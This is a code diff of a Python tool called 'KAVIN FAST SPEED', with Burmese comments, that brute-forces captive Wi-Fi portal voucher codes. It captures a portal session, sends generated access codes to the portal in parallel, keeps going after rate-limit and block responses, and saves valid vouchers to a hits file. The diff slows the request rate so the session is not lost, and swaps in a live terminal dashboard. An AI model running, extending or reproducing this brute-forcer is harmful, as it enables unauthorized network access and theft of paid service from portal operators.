@@ -1,5 +1,5 @@
 # =====================================================================
-# lakaw.py (KAVIN FAST SPEED - License Integrated)
+# lakaw.py (KAVIN FAST SPEED - Live Dashboard Edition)
 # အပိုင်း (၁) - Core Engine
 # =====================================================================
 
@@ -20,8 +20,11 @@ from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.text import Text
 from rich.prompt import Prompt
+from rich.live import Live
+from rich.panel import Panel
+from rich.layout import Layout
+from rich.align import Align
 
-# ★ License စစ်ဆေးရန် ခေါ်ယူခြင်း
 import license as _license
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -30,13 +33,13 @@ DB_FILE = "lakaw_data.db"
 STATE_FILE = "lakaw_state.json"
 HITS_FILE = "hits.txt"
 
-# ⚡ Speed Settings
-MAX_WORKERS = 15  
-BASE_SLEEP_MIN = 0.01
-BASE_SLEEP_MAX = 0.05
+# ⚡ Speed Settings (Session မပျက်အောင် နှေးနှေးလေးလုပ်ထားသည်)
+MAX_WORKERS = 5        
+BASE_SLEEP_MIN = 0.1   
+BASE_SLEEP_MAX = 0.3   
 RATE_LIMIT_SLEEP = 60 
 NETWORK_RETRY_SLEEP = 1.0
-SESSION_REFRESH_SLEEP = 2.0
+SESSION_REFRESH_SLEEP = 3.0
 
 console = Console()
 session = requests.Session()
@@ -122,17 +125,10 @@ def extract_session(value):
     except Exception: pass
     return None
 
-def extract_base_url(url_str):
-    try:
-        p = urlparse(url_str)
-        if p.scheme and p.netloc: return f"{p.scheme}://{p.netloc}"
-    except Exception: pass
-    return None
-
 def fetch_session(custom_url=""):
     if custom_url:
         try:
-            r = session.get(custom_url, timeout=3, allow_redirects=True, verify=False)
+            r = session.get(custom_url, timeout=4, allow_redirects=True, verify=False)
             p = urlparse(r.url)
             portal_base = f"{p.scheme}://{p.netloc}"
             sid = extract_session(r.url) or extract_session(r.text)
@@ -142,33 +138,39 @@ def fetch_session(custom_url=""):
     probes = [
         "http://connectivitycheck.gstatic.com/generate_204",
         "http://captive.apple.com/hotspot-detect.html",
-        "http://detectportal.firefox.com/success.txt"
+        "http://detectportal.firefox.com/success.txt",
+        "http://connectivitycheck.android.com/generate_204"
     ]
+    
     for url in probes:
         try:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
             }
-            r = session.get(url, timeout=3, allow_redirects=True, verify=False, headers=headers)
+            r = session.get(url, timeout=5, allow_redirects=True, verify=False, headers=headers)
         except Exception:
             continue
+        
         try:
             p = urlparse(r.url)
-            if "gstatic.com" in p.netloc or "apple.com" in p.netloc or "firefox.com" in p.netloc:
+            if "gstatic.com" in p.netloc or "apple.com" in p.netloc or "firefox.com" in p.netloc or "android.com" in p.netloc:
                 continue
+            
             portal_base = f"{p.scheme}://{p.netloc}"
             cands = [r.url, r.text]
             cands.extend(h.headers.get("Location", "") for h in r.history)
             cands.extend(h.url for h in r.history)
+            
             for c in cands:
                 sid = extract_session(c)
                 if sid: return portal_base, sid
+            
             try:
                 m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                 if m:
                     nxt = urljoin(r.url, m.group(1))
-                    r2 = session.get(nxt, timeout=3, allow_redirects=True, verify=False)
+                    r2 = session.get(nxt, timeout=5, allow_redirects=True, verify=False)
                     sid = extract_session(r2.url) or extract_session(r2.text)
                     if sid: return portal_base, sid
             except Exception: pass
@@ -180,7 +182,7 @@ def test_code(portal_base, session_id, code):
     headers = {"Content-Type": "application/json", "Origin": portal_base}
     payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
     try:
-        r = session.post(url, json=payload, headers=headers, timeout=2.0, verify=False)
+        r = session.post(url, json=payload, headers=headers, timeout=2.5, verify=False)
         if r.status_code == 429: return "__RATE_LIMITED__"
         return r.text if r.text else "__NETWORK_ERROR__"
     except Exception: return "__NETWORK_ERROR__"
@@ -205,18 +207,20 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 
-def render_dashboard(mode, current_code, tested, elapsed, status, hits, logs, speed, is_manual):
-    clear_screen()
-    console.print()
-    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
-    console.print(Text("⚡ KAVIN FAST SPEED ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
-    console.print()
-
+def get_dashboard_renderable(mode, current_code, tested, elapsed, status, hits, logs, speed, is_manual):
+    layout = Layout()
+    layout.split_column(
+        Layout(name="header", size=3),
+        Layout(name="body", ratio=1),
+    )
+    
+    header_text = Text("⚡ KAVIN FAST SPEED ⚡", style="bold bright_cyan", justify="center")
+    layout["header"].update(Panel(Align.center(header_text), border_style="bright_cyan"))
+    
     status_color = "bright_green" if status == "Active" else ("bright_red" if status == "Limit" else "bright_yellow")
     mode_display = "🔗 Manual" if is_manual else "🔄 Auto"
 
-    console.print(Text.assemble(
+    info_text = Text.assemble(
         ("  🎯 Code   : ", "bright_white"), (f"{current_code}\n", "bold bright_green"),
         ("  📊 Tested : ", "bright_white"), (f"{tested:,}\n", "bold bright_yellow"),
         ("  ⚡ Speed  : ", "bright_white"), (f"{speed:.1f} c/m\n", "bold bright_cyan"),
@@ -224,27 +228,40 @@ def render_dashboard(mode, current_code, tested, elapsed, status, hits, logs, sp
         ("  📡 Status : ", "bright_white"), (f"{status.upper()}\n", f"bold {status_color}"),
         ("  🏆 Hits   : ", "bright_white"), (f"{len(hits)}\n", "bold bright_magenta"),
         ("  📌 Method : ", "bright_white"), (f"{mode_display}\n", "bold bright_yellow"),
-    ))
+    )
 
-    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
-    console.print(Text("  📜 Recent Logs", style="bold bright_yellow"))
-    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
-    
-    for lg in logs[-4:]: console.print(Text.from_markup(f"  {lg}"))
-    if not logs: console.print(Text("  Waiting...", style="dim"))
+    logs_text = Text()
+    for lg in logs[-4:]:
+        logs_text.append(f"  {lg}\n")
+    if not logs: logs_text.append("  Waiting...\n", style="dim")
 
-    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
-    console.print(Text("  💎 Valid Codes Found", style="bold bright_yellow"))
-    console.print(Text("──────────────────────────────────────", style="dim bright_cyan"))
-
+    hits_text = Text()
     last_hits = hits[-3:]
     if last_hits:
         for i, h in enumerate(last_hits, 1):
             c = h.get("code", "") if isinstance(h, dict) else h
             t = h.get("time", "--:--:--") if isinstance(h, dict) else "--:--:--"
-            console.print(Text.assemble((f"  {i}. ", "dim white"),(f"{c}", "bold bright_green"),(f"   [{t}]", "dim bright_cyan")))
-    else: console.print(Text("  Searching...", style="dim"))
-    console.print()
+            hits_text.append(f"  {i}. ", style="dim white")
+            hits_text.append(f"{c}", style="bold bright_green")
+            hits_text.append(f"   [{t}]\n", style="dim bright_cyan")
+    else:
+        hits_text.append("  Searching...\n", style="dim")
+
+    body_layout = Layout()
+    body_layout.split_row(
+        Layout(Panel(info_text, title="📊 Status", border_style="bright_blue"), ratio=1),
+        Layout(name="right_col", ratio=1)
+    )
+    body_layout["right_col"].split_column(
+        Layout(Panel(logs_text, title="📜 Logs", border_style="bright_yellow")),
+        Layout(Panel(hits_text, title="💎 Valid Codes", border_style="bright_magenta"))
+    )
+    
+    layout["body"].update(body_layout)
+    return layout
+# =====================================================================
+# အပိုင်း (၂) - Scan Loop, UI နှင့် Main
+# =====================================================================
 
 def scan_loop(mode, length, portal_base=None, session_id=None, is_manual=False, scan_method="random", start_tested=0, start_hits=None):
     global seq_counter
@@ -261,105 +278,112 @@ def scan_loop(mode, length, portal_base=None, session_id=None, is_manual=False, 
     net_error_streak = 0
     conn = init_db()
     current_code = [""]
+    current_status = ["Init"]
 
-    def push_log(msg): running_logs.append(f"[dim]{time.strftime('%H:%M:%S')}[/dim] {msg}")
-    def update_ui(status):
-        elapsed = time.time() - start_time
-        speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
-        render_dashboard(mode_str, current_code[0], tested, format_time(elapsed), status, hits, running_logs, speed, is_manual)
+    def push_log(msg): 
+        running_logs.append(f"[dim]{time.strftime('%H:%M:%S')}[/dim] {msg}")
+        if len(running_logs) > 4: running_logs.pop(0)
 
-    try:
-        push_log("[bright_cyan]Engine Started...[/bright_cyan]")
-        while True:
-            try:
-                if not current_session or not current_portal:
-                    if is_manual:
-                        update_ui("Limit")
-                        push_log("[bold red]Session သက်တမ်းကုန်သွားပါပြီ။ ပြန်လည် စတင်ရန် လိုအပ်ပါသည်။[/bold red]")
-                        time.sleep(3)
-                        return
-                    else:
-                        update_ui("Init")
-                        push_log("[yellow]Session ရှာနေပါသည်...[/yellow]")
-                        current_portal, current_session = fetch_session()
-                        if not current_session:
-                            push_log("[red]Session မတွေ့ပါ။ ခဏစောင့်ပြီး ပြန်ရှာမည်...[/red]")
-                            time.sleep(SESSION_REFRESH_SLEEP)
-                            continue
-                        push_log(f"[bold green]Session တွေ့ပါပြီ: {current_session[:6]}...[/bold green]")
-                        net_error_streak = 0
+    # Live Dashboard ကို စတင်မည်
+    live = Live(get_dashboard_renderable(mode_str, "", tested, "00:00:00", "Init", hits, running_logs, 0.0, is_manual), refresh_per_second=4, screen=False)
+    
+    with live:
+        try:
+            push_log("[bright_cyan]Engine Started...[/bright_cyan]")
+            while True:
+                try:
+                    if not current_session or not current_portal:
+                        if is_manual:
+                            current_status[0] = "Limit"
+                            push_log("[bold red]Session သက်တမ်းကုန်သွားပါပြီ။[/bold red]")
+                            time.sleep(3)
+                            return
+                        else:
+                            current_status[0] = "Init"
+                            push_log("[yellow]Session ရှာနေပါသည် (Auto)...[/yellow]")
+                            current_portal, current_session = fetch_session()
+                            
+                            if not current_session:
+                                push_log("[red]Session မတွေ့ပါ။ ခဏစောင့်ပြီး ပြန်ရှာမည်...[/red]")
+                                time.sleep(SESSION_REFRESH_SLEEP)
+                                continue 
+                            
+                            push_log(f"[bold green]Session တွေ့ပါပြီ: {current_session[:6]}...[/bold green]")
+                            net_error_streak = 0
 
-                batch_codes = []
-                while len(batch_codes) < MAX_WORKERS * 2:
-                    c = gen_code(mode, length, scan_method)
-                    if c and not is_tried(conn, c):
-                        mark_tried(conn, c)
-                        batch_codes.append(c)
+                    batch_codes = []
+                    while len(batch_codes) < MAX_WORKERS * 2:
+                        c = gen_code(mode, length, scan_method)
+                        if c and not is_tried(conn, c):
+                            mark_tried(conn, c)
+                            batch_codes.append(c)
 
-                if not batch_codes: continue
-                success_hit = False
+                    if not batch_codes: continue
+                    success_hit = False
 
-                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-                    futures = {executor.submit(test_code, current_portal, current_session, code): code for code in batch_codes}
+                    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                        futures = {executor.submit(test_code, current_portal, current_session, code): code for code in batch_codes}
 
-                    for future in as_completed(futures):
-                        code = futures[future]
-                        tested += 1
-                        current_code[0] = code
-                        
-                        try: res = future.result()
-                        except Exception: continue
+                        for future in as_completed(futures):
+                            code = futures[future]
+                            tested += 1
+                            current_code[0] = code
+                            
+                            try: res = future.result()
+                            except Exception: continue
 
-                        if res == "__RATE_LIMITED__":
-                            update_ui("Limit")
-                            push_log(f"[bold red]🛡️ Rate Limited! {RATE_LIMIT_SLEEP} စက္ကန့် နားမည်...[/bold red]")
-                            time.sleep(RATE_LIMIT_SLEEP)
-                            current_session = None
-                            success_hit = True
-                            break
+                            if res == "__RATE_LIMITED__":
+                                current_status[0] = "Limit"
+                                push_log(f"[bold red]🛡️ Rate Limited! {RATE_LIMIT_SLEEP} စက္ကန့် နားမည်...[/bold red]")
+                                time.sleep(RATE_LIMIT_SLEEP)
+                                current_session = None
+                                success_hit = True
+                                break
 
-                        low = (res or "").lower()
-                        
-                        if "request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low:
-                            update_ui("Limit")
-                            push_log(f"[bold red]🛡️ Block Detected! Sleeping...[/bold red]")
-                            time.sleep(RATE_LIMIT_SLEEP)
-                            current_session = None
-                            success_hit = True
-                            break
+                            low = (res or "").lower()
+                            
+                            if "request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low:
+                                current_status[0] = "Limit"
+                                push_log(f"[bold red]🛡️ Block Detected! Sleeping...[/bold red]")
+                                time.sleep(RATE_LIMIT_SLEEP)
+                                current_session = None
+                                success_hit = True
+                                break
 
-                        if "session timed out" in low or "session timeout" in low or '"session":null' in low:
-                            push_log("[yellow]Session သက်တမ်းကုန်သွားပါပြီ။[/yellow]")
-                            current_session = None
-                            break
+                            if "session timed out" in low or "session timeout" in low or '"session":null' in low:
+                                push_log("[yellow]Session သက်တမ်းကုန်သွားပါပြီ။ အသစ်ပြန်ရှာမည်။[/yellow]")
+                                current_session = None
+                                break
 
-                        if '"success":true' in low or '"authresult":"1"' in low:
-                            existing = hits_codes_only(hits)
-                            if code not in existing:
-                                now_str = time.strftime("%H:%M:%S")
-                                hits.append({"code": code, "time": now_str})
-                                push_log(f"[bold bright_green]✨ VOUCHER FOUND: {code}[/bold bright_green]")
-                                try:
-                                    with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
-                                except Exception: pass
-                                save_state(mode_str, tested, hits, current_portal, scan_method, current_session or "", is_manual)
-                            update_ui("Active")
-                            success_hit = True
-                            break
-                        
-                        time.sleep(random.uniform(BASE_SLEEP_MIN, BASE_SLEEP_MAX))
-                        update_ui("Active")
+                            if '"success":true' in low or '"authresult":"1"' in low:
+                                existing = hits_codes_only(hits)
+                                if code not in existing:
+                                    now_str = time.strftime("%H:%M:%S")
+                                    hits.append({"code": code, "time": now_str})
+                                    push_log(f"[bold bright_green]✨ VOUCHER FOUND: {code}[/bold bright_green]")
+                                    try:
+                                        with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
+                                    except Exception: pass
+                                    save_state(mode_str, tested, hits, current_portal, scan_method, current_session or "", is_manual)
+                                current_status[0] = "Active"
+                                success_hit = True
+                                break
+                            
+                            current_status[0] = "Active"
+                            time.sleep(random.uniform(BASE_SLEEP_MIN, BASE_SLEEP_MAX))
 
-                if success_hit: time.sleep(0.5)
+                    if success_hit: time.sleep(0.5)
+                    
+                    # Dashboard ကို Update လုပ်မည်
+                    elapsed = time.time() - start_time
+                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
+                    live.update(get_dashboard_renderable(mode_str, current_code[0], tested, format_time(elapsed), current_status[0], hits, running_logs, speed, is_manual))
 
-            except KeyboardInterrupt: raise
-            except Exception:
-                time.sleep(NETWORK_RETRY_SLEEP)
-                continue
-    except KeyboardInterrupt: pass
-# =====================================================================
-# အပိုင်း (၂) - USER INTERFACE (UI) & MAIN
-# =====================================================================
+                except KeyboardInterrupt: raise
+                except Exception:
+                    time.sleep(NETWORK_RETRY_SLEEP)
+                    continue
+        except KeyboardInterrupt: pass
 
 def show_banner():
     clear_screen()
@@ -428,7 +452,11 @@ def ask_session_method():
             if not user_input: continue
 
             sid = extract_session(user_input)
-            base = extract_base_url(user_input)
+            base = None
+            try:
+                p = urlparse(user_input)
+                if p.scheme and p.netloc: base = f"{p.scheme}://{p.netloc}"
+            except: pass
 
             if not sid and not base:
                 sid = user_input
@@ -495,7 +523,6 @@ def run():
         return
 
 def main():
-    # License စစ်ဆေးမည်
     if not _license.check_approval(): 
         return
         
